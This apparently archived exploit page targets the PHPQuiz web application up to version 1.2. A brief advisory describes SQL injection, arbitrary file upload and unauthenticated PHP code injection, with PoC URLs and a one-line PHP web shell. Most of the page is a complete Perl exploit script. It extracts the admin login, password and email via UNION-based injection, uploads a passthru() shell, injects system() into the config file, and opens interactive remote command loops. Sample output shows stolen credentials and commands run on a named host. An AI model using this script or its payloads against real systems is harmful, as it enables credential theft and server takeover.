<html><head><title>phpQuiz <= 0.1.2 Remote SQL Injection / Code Execution Exploit</title></head><pre>######################################################
# 
# Title: PHPQuiz &lt;= v.1.2 Remote SQL injection/Code Execution Exploit
# Vendor  : PHPQuiz
# webiste : http://www.phpquiz.com
# Version : &lt;= v.1.2
# Severity: Critical 
# Author: Simo64 / simo64_at_morx_org
# MorX Security Reseach Team
# http://www.morx.org
# http://www.morx.org/phpquiz.txt
#
#   Details : 
#
# SQL injection in score.php
#***************************
#
#   univers var in score.php and quiz_id var in home.php are not proprely verified and can be used to inject query
#
#   PoC : http://localhost/phpquiz/front/?what=score&amp;univers=[SQL]
#		  http://localhost/phpquiz/front/?quiz=quiz&amp;univers=1&amp;step=1&amp;quiz_id=[SQL]
#
# Arbitary File Upload
#********************** 
# vulnerable code in back/upload_img.php and admin/upload_img.php near lines 74-76
# 
#  74  if (($upload) &amp;&amp; ($ok_update == &quot;yes&quot;)) {
#  75
#  76  if(@copy($image, $path)){
#  77  .....
#
# $upload , $ok_update , $image , $path variables are not sanitized and can be used to upload files
# 
#  PoC Exploit : 
#
#  &lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;http://localhost/phpquiz/back/upload_img.php?upload=1&amp;ok_update=yes&amp;path=./../img_quiz/l3ez.php&quot;&gt;
#  Download File&lt;br&gt;
#  &lt;input name=&quot;image&quot; type=&quot;file&quot; size=&quot;20&quot;&gt;&lt;br&gt;
#  &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;Upload&quot;&gt;&lt;form&gt;
#
#  phpquiz/img_quiz/ folder is by defaut writable so after uploading a simple phpshell &lt;?passthru($cmd);?&gt;
#
#  we can lanche cmd from : http://localhost/phpquiz/img_quiz/l3ez.php?cmd=ls
#
# PHP Code Injection
#********************
#
# cfgphpquiz/install.php is accessible without authentification , the script is used to 
# save configuration setting in config.inc.php.
#
# Impact:
# any remote user can post php code to the vulnerable file, view current configuration which contains sensitive information # such as admin password (plain text) and login
#
#***********************************************************************************
#
# simo64@localhost:~$ phpquiz.pl morx.org /phpquiz/ 1
# 
# /-----------------------------------------------------------\
# | PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
# |            Coded by simo64 - simo64_morx.org              |
# |                      www.morx.org                         |
# |-----------------------------------------------------------|
# |       MorX Security Research Team ©                       |
# \-----------------------------------------------------------/
# 
# Connecting to www.morx.org ...      Connected !
# 
# [+] Injecting credentials
# 
# Sending Data ...
# 
# SQL injection Succeded !
# 
#         User EMail  : admin@morx.org
#         User Login  : admin
#         User Passwd : password
# 
# [+] Exec CMD by uploading a shell       Connected !
# 
# Uploading shell ...     [OK]
# 
# Checking if successfully Uploaded ....  [OK]
# 
#                 NOW YOU CAN LAUNCH COMMANDS
# 
# simo64[at]morx.org :~$ id
# uid=48(apache) gid=48(apache) groups=48(apache),2522(psaserv)
# simo64[at]morx.org :~$ pwd
# /home/morx/public_html/phpquiz/img_quiz
# simo64[at]morx.org :~$ ls
# id_1.gif
# id_2.gif
# id_3.gif
# id_4.gif
# index.php
# zaz.php
# simo64[at]morx.org :~$ exit
# 
#!/usr/bin/perl

use IO::Socket ;
use LWP::Simple ;

print q(

/-----------------------------------------------------------\
| PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
|            Coded by simo64 - simo64_morx.org              |
|                      www.morx.org                         |
|-----------------------------------------------------------|
|                MorX Security Research Team ©              |
\-----------------------------------------------------------/

);

sub usage(){

print &quot;\nUsage   :perl $0 siteurl /path/ userid\n&quot;;
print &quot;\nExemple : perl $0 phpquiz.com /phpquiz/ 1\n&quot;;

}

if(!@ARGV){
	&amp;usage();
	exit(0)
}

$host = $ARGV[0];
$path = $ARGV[1];
$uid  = $ARGV[2];
$success = null ;
$injected = 0;
$injcheck = $path.&quot;cfgphpquiz/config.inc.php?xD=l3fou&quot;;
$phpinject = $path.&quot;cfgphpquiz/install.php?submit=Valider&amp;config_alert_email_name=%22;echo%20\@\$xD;\@system(\$morx);//MorX%20RulZ%20=)&quot;;
$injectuser = &quot;front/?what=score&amp;univers=-64%20UNION%20SELECT%20null,LOGIN,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*&quot;;
$injectpass = &quot;front/?what=score&amp;univers=-64%20UNION%20SELECT%20null,PWD,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*&quot;;
$injectmail = &quot;front/?what=score&amp;univers=-64%20UNION%20SELECT%20null,EMAIL,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*&quot;;

syswrite STDOUT , &quot;Connecting to $host ...&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
                                
   die &quot;\n\nUnable to connect to $host &quot; unless($sock) ;

syswrite STDOUT , &quot;\tConnected !\n\n\[+] Injecting credentials\n\nSending Data ...&quot;;


	print $sock &quot;GET $path$injectmail HTTP/1.1\n&quot;;
	print $sock &quot;Host: $host\n&quot;;
	print $sock &quot;Connection: Close\n\n&quot;;

	while($res = &lt;$sock&gt;){
		if($res =~ /anim_fleche_droite.gif&quot; border=&quot;0&quot;&gt;&amp;nbsp;&amp;quot;(.*?)&amp;quot;&lt;\/a&gt;/){
			$usermail = $1 ;
			$success = &quot;ok&quot; ;
			}
	}
	
if($success eq &quot;ok&quot;) { 

syswrite STDOUT , &quot;\n\nSQL injection Succeded !\n\n&quot;;
sleep 2 ;
syswrite STDOUT , &quot;\tUser EMail  : $usermail\n&quot;;
 
 my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
 
	print $sock &quot;GET $path$injectuser HTTP/1.1\n&quot;;
	print $sock &quot;Host: $host\n&quot;;
	print $sock &quot;Connection: Close\n\n&quot;;

	while($res = &lt;$sock&gt;){
		if($res =~ /&gt;&amp;nbsp;&amp;quot;(.*?)&amp;quot;/){
			$userlogin = $1 ;
			}
	}
	syswrite STDOUT , &quot;\tUser Login  : $userlogin\n&quot;;
	
my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);

	print $sock &quot;GET $path$injectpass HTTP/1.1\n&quot;;
	print $sock &quot;Host: $host\n&quot;;
	print $sock &quot;Connection: Close\n\n&quot;;

	while($res = &lt;$sock&gt;){
		if($res =~ /&gt;&amp;nbsp;&amp;quot;(.*?)&amp;quot;/){
			$userpass = $1 ;
			}
	}

syswrite STDOUT , &quot;\tUser Passwd : $userpass\n\n&quot;;


} else {print &quot;\n\nInjecting credentials Exploit Failed !\n\n&quot;;}

sleep 2;

# PART2 Remote Command Execution by uploaing shell

syswrite STDOUT , &quot;\n[+] Exec CMD by uploading a shell&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
                                
   die &quot;\n\nUnable to connect to $host &quot; unless($sock) ;

syswrite STDOUT , &quot;\tConnected !\n\n&quot;;
syswrite STDOUT , &quot;Uploading shell ...&quot;;

$data='-----------------------------7d61592213049c
Content-Disposition: form-data; name=&quot;dir&quot;

/
-----------------------------7d61592213049c
Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;zaz.php&quot;
Content-Type: text/plain

&lt;?php
if (get_magic_quotes_gpc()){$_GET[\'cmd\']=stripslashes($_GET[\'cmd\']);}
passthru($_GET[\'cmd\']);
?&gt;
-----------------------------7d61592213049c
Content-Disposition: form-data; name=&quot;submit&quot;

Upload
-----------------------------7d61592213049c--
';

$script = $path.&quot;/back/upload_img.php?upload=1&amp;ok_update=yes&amp;path=./../img_quiz/zaz.php&quot;;

$len = length $data ;

  print $sock &quot;POST $script HTTP/1.0\r\n&quot;;
  print $sock &quot;Content-Type: multipart/form-data; boundary=---------------------------7d61592213049c\r\n&quot;;
  print $sock &quot;Host: $host\r\n&quot;;
  print $sock &quot;Content-Length: $len\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;
  print $sock $data;
  
 syswrite STDOUT , &quot;\t[OK]\n\nChecking if successfully Uploaded .... &quot;;
 
my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);

 print $sock &quot;HEAD $path&quot;.&quot;img_quiz/zaz.php  HTTP/1.0\r\n&quot;;
 print $sock &quot;Host: $host\r\n&quot;;
 print $sock &quot;Connection: close\n\n&quot;;
 
 while($rep = &lt;$sock&gt;){
 if($rep =~ /HTTP\/1.1 200 OK/) { $success = 1; }
 }
if($success == 1){

	print &quot;\t[OK]\n\n\t\tNOW YOU CAN LAUNCH COMMANDS\n\n&quot;;
	
	while(){
	print &quot;simo64[at]morx.org :~\$ &quot;;
	chop($cmd=&lt;STDIN&gt;);
	exit() if ($cmd eq 'exit');
	$result = get(&quot;http://$host&quot;.$path.&quot;img_quiz/zaz.php?cmd=$cmd&quot;);
	print $result;
	}

}
else { print &quot;\tFailed !\n\nFile Upload Failed\n\n&quot; }

# STEP 3 Injecting PHPcode into config.inc.php file

print &quot;\n[+] Injecting PHP Code......\n\nConnecting ....&quot;;

my $sock = new IO::Socket::INET (PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);

die &quot;Connot Connect to $host !&quot; unless($sock);

print &quot;\tConnected !\n\nSending Data ....\t&quot;;


	print $sock &quot;GET $phpinject HTTP/1.1\n&quot;;
	print $sock &quot;Host: $host\n&quot;;
	print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
	print $sock &quot;User-Agent: MorX-Zilla\n&quot;;
	print $sock &quot;Connection: Close\n\n&quot;;
	
print &quot;\t OK\n\nChecking if code injected ...&quot;;

my $sock = new IO::Socket::INET (PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);

	print $sock &quot;GET $injcheck HTTP/1.1\n&quot;;
	print $sock &quot;Host: $host\n&quot;;
	print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
	print $sock &quot;User-Agent: MorX-Zilla\n&quot;;
	print $sock &quot;Connection: Close\n\n&quot;;
	
while($check = &lt;$sock&gt;){
if($check =~ /l3fou/) { $injected = 1; }
}
if($injected == 1 ){
print &quot;\tSucceded !\n\n\tNOW YOU ARE IN !\n\n&quot;;

while(){
	print &quot;simo\@morx.org :~\$ &quot;;
	$cmd = &lt;STDIN&gt;;
	chop($cmd);
	exit(0) if($cmd eq &quot;exit&quot;);
	$result = get(&quot;http://&quot;.$host.$path.&quot;cfgphpquiz/config.inc.php?morx=$cmd&quot;);
	print $result;
	}
}
else {print &quot;\tFailed\n\nPHPCode Injection Failed !\n\n&quot;;}

# milw0rm.com [2006-09-16]</pre></html>